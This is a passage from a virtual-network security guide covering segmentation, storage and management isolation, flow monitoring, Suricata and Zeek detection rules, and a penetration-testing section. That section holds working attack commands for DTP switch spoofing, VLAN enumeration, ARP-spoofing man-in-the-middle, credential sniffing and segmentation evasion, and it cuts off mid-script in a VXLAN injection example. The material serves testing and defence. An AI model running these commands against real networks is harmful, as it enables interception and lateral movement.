  - payment-db (port 5432 from payment-api and payment-worker only)
  - payment-cache (port 6379 from payment-api only)

Inter-application:
  - payment-api → inventory-api (port 8443, gRPC)
  - payment-api → notification-service (port 9090, async)
  - monitoring → all components (port 9100, Prometheus scrape)
```

### 5.6 Flow Analysis Before Microsegmentation

#### Methodology

1. **Enable flow collection** (NetFlow/IPFIX on virtual switches, DFW flow logs in NSX-T, conntrack logs on Proxmox)
2. **Baseline period**: Collect 2-4 weeks of traffic data to capture periodic workloads (batch jobs, backups, maintenance windows)
3. **Analyze flows**: Map source → destination → port for every unique communication
4. **Validate with application owners**: Confirm which flows are legitimate
5. **Identify anomalies**: Unexpected flows indicate misconfigurations or security issues
6. **Draft policies**: Convert validated flows to allow rules, everything else becomes implicit deny

#### Tools for Flow Analysis

| Tool | Platform | Method |
|------|----------|--------|
| NSX-T Flow Monitoring | VMware | Kernel-level DFW logs, vRealize Network Insight |
| vRealize Network Insight (Aria Operations for Networks) | VMware | Application discovery, flow visualization |
| ntopng | Both | NetFlow/sFlow/IPFIX collector with traffic analysis |
| ElastiFlow | Both | NetFlow/IPFIX → Elasticsearch → Kibana visualization |
| Proxmox firewall logs | Proxmox | conntrack + iptables logging |
| tcpdump / tshark | Both | Packet capture on virtual interfaces |
| Zeek (Bro) | Both | Protocol-level connection logs |

---

## 6. Inter-VLAN Routing Security

### 6.1 Router-on-a-Stick Vulnerabilities

In the router-on-a-stick topology (single physical link carrying multiple VLANs via 802.1Q trunking to a router), vulnerabilities include:

- **Trunk link saturation**: All inter-VLAN traffic shares one link — DoS vector
- **Trunk misconfiguration**: If the trunk allows VLANs it should not, traffic leaks
- **Subinterface ACL bypass**: If ACLs are only applied on specific subinterfaces, traffic between other VLANs flows unrestricted
- **DTP exploitation**: If Dynamic Trunking Protocol is active, an attacker can negotiate a trunk and access all VLANs

```
Vulnerable Topology:

     ┌──────────────┐
     │    Router    │
     │  .1/.1/.1    │
     │ eth0.10      │ ← Subinterface VLAN 10
     │ eth0.20      │ ← Subinterface VLAN 20
     │ eth0.30      │ ← Subinterface VLAN 30
     └──────┬───────┘
            │ trunk (802.1Q)
     ┌──────▼───────┐
     │    Switch    │
     │  VLAN 10,20,30│
     └──────────────┘
```

### 6.2 VLAN Hopping Attacks

#### Double-Tagging Attack

Exploits native VLAN handling on trunk ports:

```
Attacker Frame (on native VLAN):
[Outer Tag: Native VLAN][Inner Tag: Target VLAN][Payload]

Step 1: First switch strips outer tag (native VLAN, no tag on access port)
Step 2: Frame reaches trunk to next switch with inner tag intact
Step 3: Second switch forwards frame to target VLAN

Conditions Required:
  - Attacker on native VLAN of a trunk port
  - Target VLAN different from native VLAN
  - Asymmetric trunking (attacker cannot receive return traffic on same path)
```

#### Switch Spoofing

Attacker configures their NIC to send DTP frames, negotiating a trunk:

```bash
# Using yersinia to exploit DTP
yersinia dtp -attack 1 -interface eth0

# Or manually with custom frame generation
# Sends DTP DESIRABLE frames to negotiate trunk
```

### 6.3 Prevention Measures

```
# Cisco IOS-style prevention (applicable conceptually to virtual switches)

! Disable DTP on all access ports
interface GigabitEthernet0/1
 switchport mode access
 switchport nonegotiate
 switchport access vlan 100

! Set native VLAN to unused VLAN on all trunks
interface GigabitEthernet0/24
 switchport trunk native vlan 999
 switchport trunk allowed vlan 10,20,30
 switchport mode trunk
 switchport nonegotiate

! VLAN 999 exists but has no interfaces assigned

! Enable VLAN ACLs (VACLs) for additional filtering
vlan access-map BLOCK-LATERAL 10
 action drop
 match ip address LATERAL-BLOCK-ACL
vlan access-map BLOCK-LATERAL 20
 action forward
vlan filter BLOCK-LATERAL vlan-list 10,20,30
```

In virtual environments (Proxmox/VMware):
- VMware VDS: Port groups configured as access ports cannot be trunk-negotiated by VMs
- Proxmox: Linux bridge with `bridge-vlan-aware yes` must have explicit `tag` per VM NIC — VMs cannot inject arbitrary VLAN tags unless explicitly granted trunk access
- Use `MAC address changes: REJECT` and `Forged transmits: REJECT` on VMware port groups
- Enable `ipfilter` and `macfilter` on Proxmox VM firewall rules

### 6.4 ACLs on Virtual Routers

For inter-VLAN routing through OPNsense/pfSense:

```
# pfSense Rule Export (pf.conf syntax)

# VLAN 10 (Web) → VLAN 20 (App): Allow HTTP/HTTPS only
pass in on $VLAN10 proto tcp from 10.10.10.0/24 to 10.10.20.0/24 port {8080, 8443} keep state

# VLAN 20 (App) → VLAN 30 (DB): Allow MySQL/PostgreSQL only
pass in on $VLAN20 proto tcp from 10.10.20.0/24 to 10.10.30.0/24 port {3306, 5432} keep state

# Block VLAN 10 direct to VLAN 30 (web cannot reach database)
block in log on $VLAN10 from 10.10.10.0/24 to 10.10.30.0/24

# Block inter-web lateral movement
block in log on $VLAN10 from 10.10.10.0/24 to 10.10.10.0/24

# Allow established/related return traffic (stateful)
pass out on $VLAN20 from any to any flags S/SA keep state
pass out on $VLAN30 from any to any flags S/SA keep state

# Default deny
block in log all
```

### 6.5 Route Filtering and Policy-Based Routing

Policy-based routing (PBR) routes traffic based on criteria beyond destination IP:

```bash
# Linux PBR on Proxmox host or firewall VM
# Route traffic from VLAN 10 through inspection appliance

ip rule add from 10.10.10.0/24 table inspect-table priority 100
ip route add default via 10.10.99.1 table inspect-table

# Traffic from VLAN 10 to VLAN 30 goes through IDS
ip rule add from 10.10.10.0/24 to 10.10.30.0/24 table ids-table priority 50
ip route add 10.10.30.0/24 via 10.10.99.2 table ids-table
```

### 6.6 Traffic Engineering for Security

Asymmetric routing detection and prevention:

```bash
# Enable reverse path filtering (anti-spoofing)
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.default.rp_filter=1

# Strict mode (source address must be reachable via incoming interface)
# In /etc/sysctl.d/99-security.conf
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.log_martians = 1
```

---

## 7. Storage Network Security

### 7.1 iSCSI VLAN Isolation

iSCSI traffic must reside on a dedicated VLAN/segment with no routing to production networks:

```
Storage Network Architecture:

┌──────────────────┐        ┌──────────────────┐
│  ESXi/Proxmox    │        │  ESXi/Proxmox    │
│     Host 1       │        │     Host 2       │
│                  │        │                  │
│ vmk2: 10.20.1.1 │        │ vmk2: 10.20.1.2 │
│ (iSCSI VLAN 20) │        │ (iSCSI VLAN 20) │
└────────┬─────────┘        └────────┬─────────┘
         │                           │
    ─────┴───────────────────────────┴─────
              │ VLAN 20 (no routing) │
    ──────────┴──────────────────────┴──────
         │                           │
┌────────▼───────────────────────────▼─────┐
│         iSCSI Storage Array              │
│    Portal: 10.20.1.100 (VLAN 20)         │
│    Portal: 10.20.1.101 (VLAN 20)         │
└──────────────────────────────────────────┘
```

Security controls:
- CHAP authentication (mutual CHAP preferred)
- Initiator IQN allowlisting on the storage array
- No default gateway on the iSCSI VLAN (prevents routing)
- IPsec encryption for iSCSI if crossing untrusted segments
- Jumbo frames (MTU 9000) for performance and to prevent fragmentation-based attacks

```bash
# Proxmox iSCSI configuration with CHAP
# /etc/iscsi/iscsid.conf

node.session.auth.authmethod = CHAP
node.session.auth.username = proxmox-node1
node.session.auth.password = <CHAP-secret>
node.session.auth.username_in = storage-array
node.session.auth.password_in = <mutual-CHAP-secret>

# Discovery authentication
discovery.sendtargets.auth.authmethod = CHAP
discovery.sendtargets.auth.username = proxmox-node1
discovery.sendtargets.auth.password = <discovery-secret>
```

### 7.2 NFS Security in Virtual Environments

NFS in virtualized environments is particularly vulnerable because:
- NFSv3 has no encryption natively
- IP-based access control is the primary security mechanism (spoofable)
- Root squash can be bypassed in certain configurations

```bash
# NFS export with security controls
# /etc/exports on NFS server

/vol/vmdata  10.20.2.0/24(rw,sync,no_subtree_check,root_squash,sec=krb5p)

# sec=krb5p provides:
#   krb5  = Kerberos authentication
#   krb5i = + integrity protection
#   krb5p = + privacy (encryption)

# Firewall rules for NFS server
iptables -A INPUT -s 10.20.2.0/24 -p tcp --dport 2049 -j ACCEPT
iptables -A INPUT -s 10.20.2.0/24 -p tcp --dport 111 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
iptables -A INPUT -p tcp --dport 111 -j DROP
```

For VMware:
- NFSv4.1 with Kerberos is supported since vSphere 6.5
- Configure ESXi hosts as Kerberos principals
- Use vmkernel port groups dedicated to NFS with no VM traffic

### 7.3 Ceph Public vs Cluster Network Separation

Ceph requires two networks for secure operation:

```
┌────────────────────────────────────────────────────────────────────┐
│                        Ceph Cluster                                 │
│                                                                    │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐       │
│  │  OSD.0  │    │  OSD.1  │    │  OSD.2  │    │  MON/MGR │       │
│  │         │    │         │    │         │    │         │       │
│  │ Public: │    │ Public: │    │ Public: │    │ Public: │       │
│  │10.30.1.x│    │10.30.1.x│    │10.30.1.x│    │10.30.1.x│       │
│  │         │    │         │    │         │    │         │       │
│  │Cluster: │    │Cluster: │    │Cluster: │    │         │       │
│  │10.30.2.x│    │10.30.2.x│    │10.30.2.x│    │         │       │
│  └─────────┘    └─────────┘    └─────────┘    └─────────┘       │
│       │               │              │              │              │
│  ─────┴───────────────┴──────────────┴──────────────┴──── Public  │
│  (10.30.1.0/24 — Client access: RBD, CephFS, RGW)        Network │
│                                                                    │
│  ─────┴───────────────┴──────────────┴─────────────────── Cluster │
│  (10.30.2.0/24 — OSD replication, recovery, heartbeat)    Network │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

```ini
# /etc/ceph/ceph.conf

[global]
public_network = 10.30.1.0/24
cluster_network = 10.30.2.0/24
ms_cluster_mode = secure
ms_service_mode = secure
ms_client_mode = secure
ms_mon_cluster_mode = secure
ms_mon_service_mode = secure
ms_mon_client_mode = secure

# Enable messenger v2 encryption (msgr2)
auth_allow_insecure_global_id_reclaim = false
auth_cluster_required = cephx
auth_service_required = cephx
auth_client_required = cephx
```

The cluster network carries replication traffic (which can be massive during recovery). Separating it:
- Prevents client traffic from competing with recovery traffic
- Isolates OSD-to-OSD communication from client-facing networks
- Limits blast radius if a client is compromised (cannot intercept replication data)

### 7.4 Storage Traffic Encryption

#### IPsec for Storage Networks

```bash
# WireGuard overlay for storage traffic between sites
# /etc/wireguard/wg-storage.conf (on each Proxmox node)

[Interface]
PrivateKey = <node-private-key>
Address = 10.30.10.1/24
ListenPort = 51820
MTU = 8900  # Account for WireGuard overhead with jumbo frames

[Peer]
PublicKey = <remote-node-public-key>
AllowedIPs = 10.30.10.2/32, 10.30.1.0/24
Endpoint = 192.168.100.2:51820
PersistentKeepalive = 25
```

#### vSAN Encryption

vSAN supports:
- **Data-at-rest encryption**: AES-256-XTS, keys managed by external KMS (KMIP)
- **Data-in-transit encryption**: Encrypts all vSAN traffic between hosts

```
vSAN Encryption Network Flow:
  Host-A (vSAN vmkernel) ←── TLS 1.2/1.3 ──→ Host-B (vSAN vmkernel)
  
  KMS Integration:
  Host ←── KMIP ──→ External Key Manager (HyTrust, Thales, HashiCorp Vault)
```

### 7.5 Multipath Security

iSCSI multipath (MPIO) adds redundancy but also increases attack surface:

```bash
# /etc/multipath.conf security-relevant settings

defaults {
    user_friendly_names no  # Use WWIDs, not human names (prevents confusion attacks)
    find_multipaths strict  # Only multipath devices with multiple valid paths
    checker_timeout 30
}

blacklist {
    # Prevent multipath on local disks
    devnode "^(ram|raw|loop|fd|md|dm-|sr|scd|st)[0-9]*"
    devnode "^sd[a-b]$"  # Local boot disks
}

multipaths {
    multipath {
        wwid "3600508b1001c45d78e5e9a1b3d4c5e6f"
        alias "storage-lun01"
        path_grouping_policy failover
        no_path_retry 5
    }
}
```

Security considerations:
- Validate WWID/IQN of discovered paths
- Alert on unexpected new paths appearing
- Monitor for path flapping (potential injection attempt)

---

## 8. Management Network Isolation

### 8.1 Out-of-Band Management Security

BMC/IPMI/iLO/iDRAC interfaces provide hardware-level control and represent extremely high-value targets:

```
Management Network Isolation:

┌─────────────────────────────────────────────────────────┐
│                 ISOLATED MANAGEMENT VLAN                  │
│                   (VLAN 5, 10.0.5.0/24)                  │
│                                                         │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌──────────┐  │
│  │  iDRAC  │  │  iDRAC  │  │  iLO    │  │  IPMI    │  │
│  │ Host-01 │  │ Host-02 │  │ Host-03 │  │ Host-04  │  │
│  │10.0.5.11│  │10.0.5.12│  │10.0.5.13│  │10.0.5.14 │  │
│  └─────────┘  └─────────┘  └─────────┘  └──────────┘  │
│                      │                                   │
│              ┌───────▼───────┐                          │
│              │   Jump Host   │                          │
│              │  10.0.5.254   │                          │
│              └───────┬───────┘                          │
│                      │                                   │
└──────────────────────┼──────────────────────────────────┘
                       │ (VPN/MFA required)
                       ▼
               ┌───────────────┐
               │  Admin VPN    │
               │  Gateway      │
               └───────────────┘
```

Hardening checklist for BMC interfaces:
- Dedicated physical NIC (not shared with production)
- No default gateway (or gateway only to jump host subnet)
- Change default credentials immediately after rack-and-stack
- Disable IPMI-over-LAN if not required; use dedicated management port
- Disable unused protocols (Telnet, HTTP — use only HTTPS)
- Update firmware regularly (CVE-2019-6260, CVE-2022-40242, and similar BMC vulnerabilities are actively exploited)
- VLAN without routing to any production network
- 802.1X on management switch ports where feasible
- SNMPv3 only (disable SNMPv1/v2c)
- TLS 1.2+ for web interface

### 8.2 Dedicated Management VLAN

```ini
# Proxmox host network configuration
# /etc/network/interfaces

auto vmbr0
iface vmbr0 inet manual
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes

# Management interface (VLAN 10)
auto vmbr0.10
iface vmbr0.10 inet static
    address 10.0.10.1/24
    gateway 10.0.10.254
    # Only management traffic on this interface
    # Proxmox Web UI binds here

# Production VM traffic (no IP on host)
auto vmbr1
iface vmbr1 inet manual
    bridge-ports eno2
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
```

### 8.3 Jump Host / Bastion Architecture

```
                                Multi-Tier Bastion:

   Internet ──► [VPN Gateway w/MFA] ──► [Bastion/Jump Host] ──► Management VLAN
                                                │
                                                ├──► vCenter (10.0.10.50)
                                                ├──► Proxmox UI (10.0.10.1:8006)
                                                ├──► iDRAC (10.0.5.11-14)
                                                └──► Monitoring (10.0.10.100)
```

Bastion hardening:
- Minimal OS installation (no X11, no unnecessary packages)
- Session recording (ttyrec, asciinema, or commercial PAM)
- Time-limited access with auto-disconnect
- No persistent SSH keys — use certificate-based SSH with short-lived certificates (HashiCorp Vault SSH CA)
- Audit logging with tamper-proof remote syslog
- No direct internet access from bastion

```bash
# SSH CA certificate-based access
# Vault issues short-lived SSH certificates (1-hour TTL)

vault write ssh/sign/admin-role \
  public_key=@~/.ssh/id_ed25519.pub \
  valid_principals="admin" \
  ttl="1h"

# sshd_config on management targets
TrustedUserCAKeys /etc/ssh/trusted-ca.pub
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
MaxAuthTries 3
PermitRootLogin no
PasswordAuthentication no
```

### 8.4 API Access Restriction

#### Proxmox API Security

```bash
# Restrict API access to management network only
# /etc/default/pveproxy

ALLOW_FROM="10.0.10.0/24,10.0.5.0/24"
DENY_FROM="all"
POLICY="deny"

# API token with limited permissions
pveum user token add admin@pam automation-token --privsep=1
pveum aclmod / -user admin@pam -token automation-token -role PVEVMAdmin
```

#### vCenter API Restrictions

```
# NSX-T or vCenter appliance firewall
# /etc/vmware/appliance/firewall.conf

{
  "firewall": {
    "enable": true,
    "rules": [
      {
        "direction": "inbound",
        "protocol": "tcp",
        "port": 443,
        "source": "10.0.10.0/24",
        "action": "accept"
      },
      {
        "direction": "inbound",
        "protocol": "tcp",
        "port": 443,
        "source": "any",
        "action": "reject"
      }
    ]
  }
}
```

### 8.5 Certificate-Based Management Access

```bash
# Generate CA for management access
openssl req -x509 -newkey ec:<(openssl ecparam -name prime256v1) \
  -keyout mgmt-ca.key -out mgmt-ca.crt -days 3650 \
  -subj "/CN=Management CA/O=Internal"

# Issue client certificate for administrator
openssl req -newkey ec:<(openssl ecparam -name prime256v1) \
  -keyout admin.key -out admin.csr -nodes \
  -subj "/CN=admin@management/O=Internal"

openssl x509 -req -in admin.csr -CA mgmt-ca.crt -CAkey mgmt-ca.key \
  -CAcreateserial -out admin.crt -days 365 \
  -extfile <(echo "extendedKeyUsage=clientAuth")

# Configure Proxmox nginx proxy for mutual TLS
# /etc/pve/local/pveproxy-ssl.pem (server cert)
# Client CA verification in pveproxy configuration
```

---

## 9. Monitoring Segmented Environments

### 9.1 Flow Collection: NetFlow/sFlow/IPFIX

#### NetFlow Configuration on Virtual Switches

```bash
# Open vSwitch (OVS) NetFlow/IPFIX configuration on Proxmox

# Enable IPFIX on OVS bridge
ovs-vsctl -- set Bridge vmbr0 ipfix=@i -- \
  --id=@i create IPFIX targets=\"10.0.10.100:4739\" \
  obs_domain_id=1 obs_point_id=1 \
  cache_active_timeout=60 cache_max_flows=1000 \
  sampling=512

# Enable sFlow on OVS
ovs-vsctl -- --id=@s create sFlow agent=vmbr0 \
  target=\"10.0.10.100:6343\" header=128 \
  sampling=256 polling=10 \
  -- set Bridge vmbr0 sflow=@s
```

#### VMware VDS NetFlow (IPFIX)

```
VDS → Configure → NetFlow:
  Collector IP: 10.0.10.100
  Collector Port: 4739
  Observation Domain ID: 100
  Active Flow Timeout: 60s
  Idle Flow Timeout: 15s
  Sampling Rate: 0 (capture all) or value based on volume
  Process Internal Flows: Yes (captures VM-to-VM on same host)
```

### 9.2 Virtual TAP/SPAN Ports

#### Proxmox Port Mirroring with OVS

```bash
# Mirror all traffic from port connected to VM 100 to monitoring VM port
ovs-vsctl -- set Bridge vmbr0 mirrors=@m \
  -- --id=@m create Mirror name=monitor-tap \
  select-dst-port=@vm100 select-src-port=@vm100 \
  output-port=@monitor \
  -- --id=@vm100 get Port tap100i0 \
  -- --id=@monitor get Port tap200i0
```

#### VMware Port Mirroring

```
VDS Port Mirroring Sessions:
  Type: Encapsulated Remote Mirroring (Source)
  Source: Port group "production-web" (Ingress + Egress)
  Destination: Uplink to monitoring VLAN
  
  Type: Distributed Port Mirroring
  Source: Specific VM ports (by port ID)
  Destination: Port connected to IDS/monitoring VM
  Strip original VLAN: Yes
  Preserve original VLAN: Optional (for VLAN-aware IDS)
```

### 9.3 NSX-T Flow Visualization

NSX-T provides native flow monitoring through:

1. **Live Traffic Analysis (LTA)**: Captures packet traces between specific VMs
2. **Traceflow**: Injects synthetic packets to verify policy enforcement
3. **IPFIX export**: DFW flow logs exported to external collectors

```bash
# NSX-T Traceflow API call
curl -k -u admin:password -X POST \
  'https://nsx-manager.local/api/v1/traceflow' \
  -H 'Content-Type: application/json' \
  -d '{
    "timeout": 15000,
    "packet": {
      "resource_type": "FieldsPacketData",
      "frame_size": 128,
      "transport_type": "UNICAST",
      "src_ip": "10.100.1.10",
      "dst_ip": "10.100.2.20",
      "ip_protocol": 6,
      "src_port": 49152,
      "dst_port": 3306
    },
    "lport_id": "source-vm-logical-port-id"
  }'
```

Traceflow output shows each hop, whether the DFW allowed or dropped the packet, and where in the rule chain the decision was made.

### 9.4 Traffic Analysis Between Segments

```bash
# Zeek (formerly Bro) configuration for inter-segment analysis
# /opt/zeek/etc/node.cfg

[manager]
type=manager
host=10.0.10.200

[logger]
type=logger
host=10.0.10.200

[worker-1]
type=worker
host=10.0.10.200
interface=tap-mirror0
lb_method=pf_ring
lb_procs=4

# /opt/zeek/share/zeek/site/local.zeek
# Custom script for cross-segment violation detection

module SegmentViolation;

export {
    redef enum Notice::Type += {
        Cross_Segment_Violation,
        Unexpected_Service,
    };

    # Define expected segment communications
    const allowed_segment_pairs: set[subnet, subnet] = {
        [10.100.1.0/24, 10.100.2.0/24],  # web → app
        [10.100.2.0/24, 10.100.3.0/24],  # app → db
        [10.0.10.0/24, 10.100.0.0/16],   # mgmt → all
    } &redef;
}

event connection_established(c: connection) {
    local src_net = mask_addr(c$id$orig_h, 24);
    local dst_net = mask_addr(c$id$resp_h, 24);

    if ([cat(src_net), cat(dst_net)] !in allowed_segment_pairs) {
        NOTICE([
            $note=Cross_Segment_Violation,
            $msg=fmt("Unexpected cross-segment traffic: %s → %s:%s",
                     c$id$orig_h, c$id$resp_h, c$id$resp_p),
            $conn=c
        ]);
    }
}
```

### 9.5 Detecting Segmentation Violations

Automated detection requires:

1. **Baseline of approved flows** (from Section 5.6 flow analysis)
2. **Real-time comparison** against baseline
3. **Alerting on deviations**

```yaml
# Elasticsearch alert rule for segmentation violations
# (Watcher or ElastAlert2 format)

name: "Cross-Segment Violation Detected"
type: frequency
index: "netflow-*"
num_events: 1
timeframe:
  minutes: 5
filter:
  - bool:
      must:
        - exists:
            field: "source.ip"
        - exists:
            field: "destination.ip"
      must_not:
        # Allowed segment pairs
        - bool:
            must:
              - range: { "source.ip": { "gte": "10.100.1.0", "lte": "10.100.1.255" }}
              - range: { "destination.ip": { "gte": "10.100.2.0", "lte": "10.100.2.255" }}
        - bool:
            must:
              - range: { "source.ip": { "gte": "10.100.2.0", "lte": "10.100.2.255" }}
              - range: { "destination.ip": { "gte": "10.100.3.0", "lte": "10.100.3.255" }}
alert:
  - type: "slack"
    slack_webhook_url: "https://hooks.slack.com/services/..."
    alert_text: |
      SEGMENTATION VIOLATION DETECTED
      Source: {source.ip} ({source.geo.country_name})
      Destination: {destination.ip}
      Port: {destination.port}
      Protocol: {network.transport}
      Bytes: {network.bytes}
```

### 9.6 Alerting on Unexpected Cross-Segment Traffic

Integration with SIEM platforms:

```bash
# Suricata rule for detecting cross-segment SSH (should only come from management)
alert tcp !10.0.10.0/24 any -> 10.100.0.0/16 22 \
  (msg:"POLICY Cross-segment SSH from non-management source"; \
   flow:to_server,established; \
   classtype:policy-violation; \
   sid:1000001; rev:1;)

# Detect VLAN hopping indicators (double-tagged frames)
alert eth any any -> any any \
  (msg:"VLAN-HOPPING Double-tagged 802.1Q frame detected"; \
   content:"|81 00|"; offset:12; depth:2; \
   content:"|81 00|"; distance:2; within:4; \
   classtype:attempted-recon; \
   sid:1000002; rev:1;)

# Detect storage protocol on non-storage segments
alert tcp any any -> !10.20.0.0/16 3260 \
  (msg:"POLICY iSCSI traffic on non-storage network"; \
   flow:to_server; \
   classtype:policy-violation; \
   sid:1000003; rev:1;)
```

---

## 10. Penetration Testing Virtual Networks

### 10.1 VLAN Hopping Attacks in Virtual Environments

In virtual environments, VLAN hopping takes different forms than physical networks. Standard double-tagging requires a native VLAN trunk port — in VMware/Proxmox, VMs typically connect to access ports. However:

#### Misconfigurations That Enable Hopping

```bash
# Scenario 1: VM configured with VLAN trunk access on Proxmox
# If a VM NIC is set with trunks=1-4094 (or no specific tag)
# /etc/pve/qemu-server/100.conf
net0: virtio=AA:BB:CC:00:00:01,bridge=vmbr0  # No tag = trunk access!

# The VM can now send tagged frames to any VLAN on vmbr0
# Exploitation from inside the VM:
ip link add link eth0 name eth0.100 type vlan id 100
ip addr add 10.10.10.200/24 dev eth0.100
ip link set eth0.100 up

# Scenario 2: VMware port group allows VLAN trunking
# If "VLAN type" is set to "VLAN Trunking" with range 0-4094
# VM can access all VLANs in the trunk range
```

#### Testing Methodology

```bash
# From a compromised VM, enumerate accessible VLANs
for vlan_id in $(seq 1 4094); do
  ip link add link eth0 name eth0.$vlan_id type vlan id $vlan_id 2>/dev/null
  ip addr add 10.10.$vlan_id.254/24 dev eth0.$vlan_id 2>/dev/null
  ip link set eth0.$vlan_id up 2>/dev/null
  # Try ARP scan to see if VLAN is reachable
  arping -c 1 -w 1 -I eth0.$vlan_id 10.10.$vlan_id.1 2>/dev/null | grep -q "reply" && \
    echo "[+] VLAN $vlan_id is accessible!"
  ip link del eth0.$vlan_id 2>/dev/null
done
```

### 10.2 ARP Spoofing Across Virtual Switches

Virtual switches have different ARP spoofing protections:

```
VMware Protections:
  - MAC Address Changes: REJECT → prevents MAC spoofing
  - Forged Transmits: REJECT → prevents frames with forged source MAC
  - Promiscuous Mode: REJECT → prevents NIC from seeing all traffic

Proxmox Protections:
  - macfilter: 1 → only allows configured MAC
  - ipfilter: 1 → only allows configured IP
  - arp/rarp filter in nftables/iptables on the bridge
```

#### ARP Spoofing When Protections Are Missing

```bash
# If macfilter/forged transmits are not enforced:
# ARP spoof to become MITM between two VMs

# Tool: arpspoof (from dsniff package)
arpspoof -i eth0 -t 10.100.1.10 10.100.1.1    # Tell VM-A that we are the gateway
arpspoof -i eth0 -t 10.100.1.1 10.100.1.10    # Tell gateway that we are VM-A

# Enable IP forwarding to maintain connectivity
echo 1 > /proc/sys/net/ipv4/ip_forward

# Or with ettercap for full MITM:
ettercap -T -q -i eth0 -M arp:remote /10.100.1.10// /10.100.1.1//

# Bettercap (modern alternative):
bettercap -iface eth0 -eval "set arp.spoof.targets 10.100.1.10; arp.spoof on; net.sniff on"
```

#### Testing Whether ARP Protections Work

```bash
# Attempt to change MAC address (tests macfilter)
ip link set eth0 address AA:BB:CC:DD:EE:FF
# If blocked: "RTNETLINK answers: Operation not permitted" or traffic stops

# Attempt to send frames with different source MAC (tests forged transmits)
python3 -c "
from scapy.all import *
pkt = Ether(src='AA:BB:CC:DD:EE:FF', dst='FF:FF:FF:FF:FF:FF')/ARP(
    op='who-has',
    psrc='10.100.1.1',
    hwsrc='AA:BB:CC:DD:EE:FF',
    pdst='10.100.1.10'
)
sendp(pkt, iface='eth0', count=5)
"
# If forged transmits is REJECT, these frames are dropped at the vSwitch
```

### 10.3 Escaping Network Segments Through Misconfigurations

Common misconfigurations that allow segment escape:

#### Dual-Homed VMs

```bash
# A VM with interfaces in multiple segments can route between them
# Check for routing enabled on compromise VM:
cat /proc/sys/net/ipv4/ip_forward
ip route show

# If ip_forward=1 and VM has interfaces in VLAN 100 and VLAN 200:
# Attacker on VLAN 100 can route through this VM to VLAN 200

# Discovery: scan for dual-homed hosts
nmap -sn 10.100.1.0/24 -oG - | grep "Up" | awk '{print $2}' > hosts.txt
# Then for each host, check if it responds on other subnets
for host in $(cat hosts.txt); do
  # Check ARP tables for entries in other subnets
  ssh $host "ip neigh show" 2>/dev/null | grep -v "10.100.1." && \
    echo "[!] $host may be dual-homed"
done
```

#### Shared Services as Pivot Points

```bash
# DNS, DHCP, NTP servers often have access to multiple VLANs
# If compromised, they become pivot points

# Identify services accessible from current segment
nmap -sV -p 53,67,68,123,389,636 10.100.1.0/24

# Check if the DNS server also resolves names in other segments
dig @10.100.1.53 internal-db.segment3.local
# If it responds with an IP in another segment, the DNS server has
# visibility into that segment — potential pivot target
```

#### Firewall Rule Gaps

```bash
# Test for asymmetric rules (allowed in one direction but not the other)
# From segment A, try to reach segment B
nmap -sS -Pn -p 1-65535 10.100.2.0/24 --reason

# Look for rules that allow "established" traffic without proper state tracking
# Craft packets with ACK flag set (bypasses some stateless firewalls)
nmap -sA -Pn 10.100.2.0/24

# Test for ICMP-based traversal
# Some firewalls allow all ICMP, enabling:
# - ICMP tunneling (icmpsh, ptunnel)
# - ICMP redirect attacks
ping -c 1 10.100.2.1 && echo "[+] ICMP to segment 2 allowed"
```

### 10.4 Testing Microsegmentation Effectiveness

#### Systematic Approach

```bash
#!/bin/bash
# microseg_test.sh — Test microsegmentation policy enforcement
# Run from each workload to verify isolation

CURRENT_SEGMENT="10.100.1"
SEGMENTS=("10.100.1" "10.100.2" "10.100.3" "10.0.10" "10.20.1")
COMMON_PORTS=(22 80 443 3306 5432 6379 8080 8443 9090 27017)

echo "=== Microsegmentation Validation ==="
echo "Source: $(hostname) / $(ip -4 addr show eth0 | grep inet | awk '{print $2}')"
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

for segment in "${SEGMENTS[@]}"; do
  echo "--- Testing segment: $segment.0/24 ---"
  
  # Host discovery
  alive=$(nmap -sn -n ${segment}.0/24 2>/dev/null | grep "up" | wc -l)
  echo "  Hosts alive: $alive"
  
  # Port scanning sample hosts
  for port in "${COMMON_PORTS[@]}"; do
    result=$(nmap -sS -Pn -n -p $port ${segment}.1-10 2>/dev/null | \
             grep "open" | wc -l)
    if [ $result -gt 0 ]; then
      echo "  [!] Port $port OPEN on $result hosts in $segment.0/24"
    fi
  done
done

echo ""
echo "=== DNS-Based Segment Discovery ==="
# Try zone transfers
for ns in $(dig NS internal.local +short); do
  dig AXFR internal.local @$ns 2>/dev/null | grep -v "^;" | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u
done
```

#### Validating Tag-Based Policies

```bash
# If running in NSX-T environment, tags should prevent cross-tier access
# Test: from a "tier:web" VM, attempt to reach "tier:database" VMs

# Step 1: Identify database tier targets (if DNS resolution works)
dig db-primary.internal.local
dig db-replica.internal.local

# Step 2: Direct connection attempts
mysql -h 10.100.3.10 -u test -p'test' 2>&1
# Expected: timeout or connection refused (blocked by DFW)

# Step 3: Protocol evasion attempts
# Tunnel MySQL over HTTPS (if 443 is allowed web→db for some reason)
# socat on attacker: socat TCP-LISTEN:3306,fork \
#   OPENSSL:10.100.3.10:443,cert=client.pem

# Step 4: Check if ICMP is unrestricted between tiers
ping -c 3 10.100.3.10
traceroute 10.100.3.10
```

### 10.5 Man-in-the-Middle in Virtual Networks

#### Exploiting Promiscuous Mode

```bash
# If promiscuous mode is allowed on the port group:
ip link set eth0 promisc on
tcpdump -i eth0 -nn 'not host <own-ip>'

# On VMware: if "Promiscuous Mode: Accept" is set on the port group,
# the VM receives ALL traffic on that port group (including other VMs)

# Capture credentials:
tcpdump -i eth0 -A -nn 'port 80 or port 21 or port 110 or port 143'
```

#### GRE/VXLAN Tunnel Injection

```bash
# If VXLAN is in use and the TEP network is reachable:
# Inject frames into overlay segments by crafting VXLAN-encapsulated packets

python3 -c "
from scapy.all import *

# Craft VXLAN-encapsulated frame targeting VNI 100100
